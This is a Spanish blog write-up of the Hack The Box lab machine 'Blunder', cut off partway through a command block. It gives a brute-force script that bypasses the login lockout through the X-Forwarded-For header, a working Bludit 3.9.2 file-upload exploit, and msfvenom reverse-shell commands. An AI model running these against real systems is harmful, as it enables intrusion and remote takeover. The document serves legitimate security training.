<!DOCTYPE html>
<html lang="es"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Maquina Retirada Blunder de Hack The Box (Necesario VIP) | Pirrandi Blog</title>
<meta name="generator" content="Jekyll v3.9.3" />
<meta property="og:title" content="Maquina Retirada Blunder de Hack The Box (Necesario VIP)" />
<meta name="author" content="Pirrandi" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada BLUNDER" />
<meta property="og:description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada BLUNDER" />
<link rel="canonical" href="http://localhost:4000/2021/05/12/Blunder-~-Hack-The-Box.html" />
<meta property="og:url" content="http://localhost:4000/2021/05/12/Blunder-~-Hack-The-Box.html" />
<meta property="og:site_name" content="Pirrandi Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-05-12T00:00:00-03:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Maquina Retirada Blunder de Hack The Box (Necesario VIP)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Pirrandi"},"dateModified":"2021-05-12T00:00:00-03:00","datePublished":"2021-05-12T00:00:00-03:00","description":"En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada BLUNDER","headline":"Maquina Retirada Blunder de Hack The Box (Necesario VIP)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/05/12/Blunder-~-Hack-The-Box.html"},"url":"http://localhost:4000/2021/05/12/Blunder-~-Hack-The-Box.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Pirrandi Blog" /></head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Pirrandi Blog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">
    
    
        <img src="" class="author-avatar" alt="Avatar" />
    
Este es mi blog personal sobre Conceptos Hacking Etico // HTB // TryHackMe // Resumenes de Hacking // Herramientas para distintas tareas.

</div>


<div class="post">
  <h1 class="post-title">Maquina  Retirada Blunder de Hack The Box (Necesario VIP)</h1>
  
  <div class="post-tags">
     
      <a class="tag" href="/tag/HTB,/">HTB,</a>
      
      <a class="tag" href="/tag/Bypass,/">Bypass,</a>
      
      <a class="tag" href="/tag/Python3,/">Python3,</a>
      
      <a class="tag" href="/tag/BruteForce,/">BruteForce,</a>
      
      <a class="tag" href="/tag/Web/">Web</a>
      
      <a class="tag" href="/tag/Hacking,/">Hacking,</a>
      
      <a class="tag" href="/tag/Sudo/">Sudo</a>
      
      <a class="tag" href="/tag/1.8,/">1.8,</a>
      
      <a class="tag" href="/tag/Maquinas/">Maquinas</a>
      
      <a class="tag" href="/tag/Retiradas,/">Retiradas,</a>
      
      <a class="tag" href="/tag/Writeup/">Writeup</a>
      
  </div>
  
  <div class="post-date">Published on 12 May 2021</div>
  
  <noscript>
    <div class="post-description">En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada BLUNDER</div>
  </noscript>
  <div id="animated-post-description" class="post-description" style="display: none;"></div>
  
  <h1 id="blunder--hack-the-box">Blunder ~ Hack The Box</h1>

<p>Realizamos el Primer escaneo con Nmap</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.191       "</span>
</code></pre></div></div>
<p>Procedemos con el siguiente escaneo de Nmap</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" nmap -sC -sV -p80 -oN target 10.10.10.191       "</span>
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Blunder | A blunder of interesting facts
</code></pre></div></div>
<p>Vemos que solo tiene el puerto 80/http abierto</p>

<p>Con la herramienta Wfuzz procedemos a escanear por rutas y directorios en la IP</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># wfuzz -c -L --hc=404 --hl=170 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt http://10.10.10.191/FUZZ</span>
<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>
Target: http://10.10.10.191/FUZZ
Total requests: 207643
<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                   
<span class="o">=====================================================================</span>
000000026:   200        105 L    303 W      3280 Ch     <span class="s2">"about"</span>                                   
000000256:   200        70 L     157 W      2385 Ch     <span class="s2">"admin"</span>                                   
000002387:   200        110 L    387 W      3959 Ch     <span class="s2">"usb"</span>      
</code></pre></div></div>
<p>miramos en estos directorios y no encontramos ninguna informacion valiosa…
Volvemos a usar la herramienta <code class="language-plaintext highlighter-rouge">Wfuzz</code> para buscar por extensiones (PHP y TXT) usando un Doble Fuzzing:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" wfuzz -c -L --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -w dicc http://10.10.10.191/FUZZ.FUZ2Z      "</span>
<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>
Target: http://10.10.10.191/FUZZ.FUZ2Z
Total requests: 415286
<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                   
<span class="o">=====================================================================</span>                                          
000001397:   200        0 L      5 W        30 Ch       <span class="s2">"install - php"</span>                           
000003310:   200        1 L      4 W        22 Ch       <span class="s2">"robots - txt"</span>                            
000004668:   200        4 L      23 W       118 Ch      <span class="s2">"todo - txt"</span>      
</code></pre></div></div>
<p>Listamos el archivo encontrado</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"http://10.10.10.191/todo.txt   "</span>

<span class="nt">-Update</span> the CMS
<span class="nt">-Turn</span> off FTP - DONE
<span class="nt">-Remove</span> old <span class="nb">users</span> - DONE
<span class="nt">-Inform</span> <span class="s2">"fergus"</span> that the new blog needs images - PENDING					
<span class="nt">-Encontramos</span> un <span class="s2">"User"</span>: <span class="s2">"fergus"</span>
</code></pre></div></div>
<p>Teniendo un Usuario valido, probamos a hacer fuerza bruta contra el panel login del CMS Bludit y nos salta un bloqueo a los 10 intentos.
Miramos en searchsploit Bludit CMS 
Vemos que hay varias reportes interesantes
Nos fijamos en el de Metasploit y lo inspeccionamos para ver que esta haciendo, y vemos que para hacer fuerza bruta cambia el valor de la cabecera  X-Forwarded-For</p>

<h1 id="haciendo-bypass-brute-force-al-panel-login-de-bludit-cms">Haciendo Bypass Brute Force al Panel Login de Bludit CMS</h1>
<p>Nos montamos un script en python3 para conseguir hacer fuerza bruta contra el panel login y saltarnos el bloqueo atraves de la cabecera X-Forwarded-For</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>  
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">signal</span>
<span class="kn">import</span> <span class="nn">re</span> 
<span class="kn">import</span> <span class="nn">pdb</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>  

<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[*] Saliendo . . .</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="c1">#Ctrl + C
</span><span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>

<span class="c1">#Variable Global
</span><span class="n">main_url</span> <span class="o">=</span> <span class="s">"http://10.10.10.191/admin/login.php"</span>


<span class="k">def</span> <span class="nf">makeRequest</span><span class="p">():</span>
<span class="c1"># peticion s que almacena la session(Cookies, etc)
</span>        <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>

<span class="c1"># Creamos la variable f que nos abra el archivo diccionario en modo read
</span>        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"diccionario.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
<span class="c1"># Barras de Progreso
</span>        <span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Fuerza bruta"</span><span class="p">)</span>
        <span class="n">p1</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Iniciando Ataque de Fuerza Bruta"</span><span class="p">)</span>
        <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="c1"># Creando el bucle para realizar fuerza bruta  
</span>        <span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">f</span><span class="p">.</span><span class="n">readlines</span><span class="p">():</span>

<span class="c1"># Pillando el tokenCSRF con la libreria RE y usando expresiones regulares para filtrar por la data de "value=", a niver de la respuesta de la peticion response
</span>                <span class="n">response</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">main_url</span><span class="p">)</span>
                <span class="n">tokenCSRF</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'name="tokenCSRF" value="(.*?)"'</span><span class="p">,</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

<span class="c1"># Campo del login, Data que tramitamos
</span>                <span class="n">data_post</span> <span class="o">=</span> <span class="p">{</span>
                <span class="s">'tokenCSRF'</span> <span class="p">:</span> <span class="n">tokenCSRF</span><span class="p">,</span>
                <span class="s">'username'</span> <span class="p">:</span> <span class="s">'fergus'</span><span class="p">,</span>
                <span class="s">'password'</span> <span class="p">:</span> <span class="s">'%s'</span> <span class="o">%</span> <span class="n">password</span><span class="p">.</span><span class="n">strip</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> 
                <span class="p">}</span>

<span class="c1"># Usamos estos headers para saltarnos las restricciones de IP Block a nivel web
</span>                <span class="n">headers_login</span> <span class="o">=</span> <span class="p">{</span>

                <span class="s">'User-Agent'</span> <span class="p">:</span> <span class="s">'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'</span><span class="p">,</span>
                <span class="s">'Referer'</span> <span class="p">:</span> <span class="s">'http://10.10.10.191/admin/login'</span><span class="p">,</span>
                <span class="s">'X-Forwarded-For'</span> <span class="p">:</span> <span class="s">'%s'</span> <span class="o">%</span> <span class="n">password</span><span class="p">.</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
                <span class="p">}</span>

<span class="c1"># Barra de progreso de peticions * passwords
</span>                <span class="n">p1</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Probando con la password %s"</span> <span class="o">%</span> <span class="n">password</span><span class="p">.</span><span class="n">strip</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">))</span>

<span class="c1"># Variable r que es la peticcion HTTP via POST y tramita con los siguientes argumentos
</span>                <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">main_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data_post</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers_login</span><span class="p">)</span>

<span class="c1"># Comprobacion de password correcta
</span>                <span class="k">if</span> <span class="s">"Username or password incorrect"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
                        <span class="n">p1</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"La password es %s"</span> <span class="o">%</span> <span class="n">password</span><span class="p">.</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">))</span>
                        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>

        <span class="n">makeRequest</span><span class="p">()</span>
</code></pre></div></div>

<p>Con el script listo para ejecutarse, procedemos a crearnos un <code class="language-plaintext highlighter-rouge">diccionario.txt</code> de las palabras de la web con la herramienta <code class="language-plaintext highlighter-rouge">"CEWL"</code>
<a href="https://esgeeks.com/como-utilizar-cewl/">Uso de CEWL</a></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>cewl http://10.10.10.191 <span class="nt">-w</span> diccionario.txt
</code></pre></div></div>
<p>Ejecutamos el script en python3 y nos reporta una password <code class="language-plaintext highlighter-rouge">"RolandDeschain"</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Buscamos google por BLUDIT CMS y vemos un repositorio de github con mas rutas interesantes como la de “bl-plugins”

 http://10.10.10.191/bl-plugins/backup/metadata.json
									
|                 author |                                                <span class="s2">" Bludit"</span> |
| email | <span class="s2">""</span> |
| website | <span class="s2">"https://plugins.bludit.com"</span> |
| version | <span class="s2">"3.9.2"</span> |
| releaseDate | <span class="s2">"2019-06-21"</span> |
| license | <span class="s2">"MIT"</span> |
| compatible | <span class="s2">"3.9.2"</span> |
| notes | <span class="s2">""</span> |
</code></pre></div></div>
<p>Ya tenemos la version del Bludit CMS, y tras una segunda busqueda encontramos este exploit en python3</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Title: Bludit 3.9.2 - Directory Traversal
# Author: James Green
# Date: 2020-07-20
# Vendor Homepage: https://www.bludit.com
# Software Link: https://github.com/bludit/bludit
# Version: 3.9.2
# Tested on: Linux Ubuntu 19.10 Eoan# CVE: CVE-2019-16113
# 
# Special Thanks to Ali Faraj (@InfoSecAli) and authors of MSF Module https://www.exploit-db.com/exploits/47699
</span>
<span class="c1">#### USAGE ####
# 1. Create payloads: .png with PHP payload and the .htaccess to treat .pngs like PHP
# 2. Change hardcoded values: URL is your target webapp, username and password is admin creds to get to the admin dir
# 3. Run the exploit
# 4. Start a listener to match your payload: `nc -nlvp 53`, meterpreter multi handler, etc
# 5. Visit your target web app and open the evil picture: visit url + /bl-content/tmp/temp/evil.png
</span>
<span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">threading</span>

<span class="kn">from</span> <span class="nn">requests.exceptions</span> <span class="kn">import</span> <span class="n">Timeout</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Cambiando los Valores a los nuestros
</span><span class="n">url</span> <span class="o">=</span> <span class="s">'http://10.10.10.191'</span>  <span class="c1"># CHANGE ME
</span><span class="n">username</span> <span class="o">=</span> <span class="s">'fergus'</span>  <span class="c1"># CHANGE ME
</span><span class="n">password</span> <span class="o">=</span> <span class="s">'RolandDeschain'</span>  <span class="c1"># CHANGE ME
</span><span class="n">lport</span> <span class="o">=</span> <span class="mi">443</span>

<span class="c1"># Paso 1
# msfvenom -p php/reverse_php LHOST=127.0.0.1 LPORT=53 -f raw -b '"' &gt; evil.png
# echo -e "&lt;?php $(cat evil.png)" &gt; evil.png 
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'evil.png'</span>  <span class="c1"># CREATE ME
</span>
<span class="c1"># Paso 2
# echo "RewriteEngine off" &gt; .htaccess
# echo "AddType application/x-httpd-php .png" &gt;&gt; .htaccess
</span><span class="n">payload2</span> <span class="o">=</span> <span class="s">'.htaccess'</span>  <span class="c1"># CREATE ME
</span>
<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">):</span>
    <span class="s">""" Log in with provided admin creds, grab the cookie once authenticated """</span>

    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">login_page</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">"/admin/"</span><span class="p">)</span>
    <span class="n">csrf_token</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'input.+?name="tokenCSRF".+?value="(.+?)"'</span><span class="p">,</span>
                           <span class="n">login_page</span><span class="p">.</span><span class="n">text</span>
                 <span class="p">).</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">cookie</span> <span class="o">=</span> <span class="p">((</span><span class="n">login_page</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">"Set-Cookie"</span><span class="p">]).</span><span class="n">split</span><span class="p">(</span><span class="s">";"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"save"</span><span class="p">:</span><span class="s">""</span><span class="p">,</span>
            <span class="s">"password"</span><span class="p">:</span><span class="n">password</span><span class="p">,</span>
            <span class="s">"tokenCSRF"</span><span class="p">:</span><span class="n">csrf_token</span><span class="p">,</span>
            <span class="s">"username"</span><span class="p">:</span><span class="n">username</span><span class="p">}</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Origin"</span><span class="p">:</span><span class="n">url</span><span class="p">,</span>
               <span class="s">"Accept"</span><span class="p">:</span><span class="s">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span><span class="p">,</span>
               <span class="s">"Upgrade-Insecure-Requests"</span><span class="p">:</span><span class="s">"1"</span><span class="p">,</span>
               <span class="s">"User-Agent"</span><span class="p">:</span><span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0"</span><span class="p">,</span>
               <span class="s">"Connection"</span><span class="p">:</span><span class="s">"close"</span><span class="p">,</span>
               <span class="s">"Referer"</span><span class="p">:</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"/admin/"</span><span class="p">,</span>
               <span class="s">"Accept-Language"</span><span class="p">:</span><span class="s">"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3"</span><span class="p">,</span>
               <span class="s">"Accept-Encoding"</span><span class="p">:</span><span class="s">"gzip, deflate"</span><span class="p">,</span>
               <span class="s">"Content-Type"</span><span class="p">:</span><span class="s">"application/x-www-form-urlencoded"</span>
    <span class="p">}</span>
    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">"BLUDIT-KEY"</span><span class="p">:</span><span class="n">cookie</span><span class="p">}</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">"/admin/"</span><span class="p">,</span>
                            <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span>
                            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
                            <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span>
                            <span class="n">allow_redirects</span> <span class="o">=</span> <span class="bp">False</span>
               <span class="p">)</span>

    <span class="k">print</span><span class="p">(</span><span class="s">"cookie: "</span> <span class="o">+</span> <span class="n">cookie</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">cookie</span>

<span class="k">def</span> <span class="nf">get_csrf_token</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">cookie</span><span class="p">):</span>
    <span class="s">""" Grab the CSRF token from an authed session """</span>

    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Origin"</span><span class="p">:</span><span class="n">url</span><span class="p">,</span>
               <span class="s">"Accept"</span><span class="p">:</span><span class="s">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span><span class="p">,</span>
               <span class="s">"Upgrade-Insecure-Requests"</span><span class="p">:</span><span class="s">"1"</span><span class="p">,</span>
               <span class="s">"User-Agent"</span><span class="p">:</span><span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0"</span><span class="p">,</span>
               <span class="s">"Connection"</span><span class="p">:</span><span class="s">"close"</span><span class="p">,</span>
               <span class="s">"Referer"</span><span class="p">:</span><span class="n">url</span> <span class="o">+</span> <span class="s">"/admin/"</span><span class="p">,</span>
               <span class="s">"Accept-Language"</span><span class="p">:</span><span class="s">"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3"</span><span class="p">,</span>
               <span class="s">"Accept-Encoding"</span><span class="p">:</span><span class="s">"gzip, deflate"</span><span class="p">}</span>
    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">"BLUDIT-KEY"</span><span class="p">:</span><span class="n">cookie</span><span class="p">}</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">"/admin/dashboard"</span><span class="p">,</span>
                           <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
                           <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span>
               <span class="p">)</span>
    <span class="n">csrf_token</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'var tokenCSRF = "'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'"'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

    <span class="k">print</span><span class="p">(</span><span class="s">"csrf_token: "</span> <span class="o">+</span> <span class="n">csrf_token</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">csrf_token</span>

<span class="k">def</span> <span class="nf">upload_evil_image</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">csrf_token</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">override_uuid</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
    <span class="s">""" Upload files required for to execute PHP from malicious image files. Payload and .htaccess """</span>

    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">files</span><span class="o">=</span> <span class="p">{</span><span class="s">"images[]"</span><span class="p">:</span> <span class="p">(</span><span class="n">payload</span><span class="p">,</span>
                         <span class="nb">open</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">),</span>
                         <span class="s">"multipart/form-data"</span><span class="p">,</span>
                         <span class="p">{</span><span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"image/png"</span><span class="p">,</span> <span class="s">"filename"</span><span class="p">:</span><span class="n">payload</span><span class="p">}</span>
                        <span class="p">)}</span>
    <span class="k">if</span> <span class="n">override_uuid</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"uuid"</span><span class="p">:</span> <span class="s">"../../tmp/temp"</span><span class="p">,</span>
                <span class="s">"tokenCSRF"</span><span class="p">:</span><span class="n">csrf_token</span><span class="p">}</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="c1"># On the vuln app, this line occurs first:
</span>        <span class="c1"># Filesystem::mv($_FILES['images']['tmp_name'][$uuid], PATH_TMP.$filename);
</span>        <span class="c1"># Even though there is a file extension check, it won't really stop us
</span>        <span class="c1"># from uploading the .htaccess file.
</span>        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"tokenCSRF"</span><span class="p">:</span><span class="n">csrf_token</span><span class="p">}</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Origin"</span><span class="p">:</span><span class="n">url</span><span class="p">,</span>
               <span class="s">"Accept"</span><span class="p">:</span><span class="s">"*/*"</span><span class="p">,</span>
               <span class="s">"X-Requested-With"</span><span class="p">:</span><span class="s">"XMLHttpRequest"</span><span class="p">,</span>
               <span class="s">"User-Agent"</span><span class="p">:</span><span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0"</span><span class="p">,</span>
               <span class="s">"Connection"</span><span class="p">:</span><span class="s">"close"</span><span class="p">,</span>
               <span class="s">"Referer"</span><span class="p">:</span><span class="n">url</span> <span class="o">+</span> <span class="s">"/admin/new-content"</span><span class="p">,</span>
               <span class="s">"Accept-Language"</span><span class="p">:</span><span class="s">"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3"</span><span class="p">,</span>
               <span class="s">"Accept-Encoding"</span><span class="p">:</span><span class="s">"gzip, deflate"</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">"BLUDIT-KEY"</span><span class="p">:</span><span class="n">cookie</span><span class="p">}</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">"/admin/ajax/upload-images"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Uploading payload: "</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
<span class="c1"># Creamos una variable que sea una peticion a la ruta del archivo malicioso para que se ejecute a nivel de sistema por peticon GET HTTP
</span>    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">"/bl-content/tmp/temp/evil.png"</span> <span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>

    <span class="n">cookie</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
    <span class="n">token</span> <span class="o">=</span> <span class="n">get_csrf_token</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookie</span><span class="p">)</span>
    <span class="n">upload_evil_image</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>
    <span class="n">upload_evil_image</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="n">payload2</span><span class="p">)</span>
</code></pre></div></div>
<p>Con este script tenemos que crearnos dos archivitos especificados en los pasos arriba, setear los datos que nos pide. Lo hacemos</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># msfvenom -p php/reverse_php LHOST=10.10.15.4 LPORT=443 -f raw -b '"' &gt; evil.png

[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
Found 2 compatible encoders
Attempting to encode payload with 1 iterations of php/base64
php/base64 succeeded with size 4053 (iteration=0)
php/base64 chosen with final size 4053
Payload size: 4053 bytes                                                                                                       
                                                                                                          
# echo -e "&lt;?php $(cat evil.png)" &gt; "evil.png" 
                                                                                                          
# echo "RewriteEngine off" &gt; ".htaccess"                                               
